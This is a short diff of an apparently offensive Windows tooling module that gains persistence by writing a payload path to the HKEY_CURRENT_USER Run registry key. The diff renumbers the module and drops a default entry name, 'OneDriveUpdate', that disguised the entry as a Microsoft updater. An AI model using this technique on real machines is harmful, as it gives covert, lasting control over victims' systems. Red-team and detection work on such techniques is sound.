@@ -3,7 +3,7 @@ from winpwnage.core.utils import *
 
 hkcurun_info = {
 	"Description": "Gain persistence using HKEY_CURRENT_USER Run registry key",
-	"Id": "21",
+	"Id": "6",
 	"Type": "Persistence",
 	"Fixed In": "99999",
 	"Works From": "7600",
@@ -13,7 +13,7 @@ hkcurun_info = {
 }
 
 
-def hkcu_run(payload, name='OneDriveUpdate', add=True):
+def hkcu_run(payload, name="", add=True):
 	if add:
 		if payloads().exe(payload):
 			if registry().modify_key(hkey="hkcu", path="Software\\Microsoft\\Windows\\CurrentVersion\\Run", name=name, value=payload):
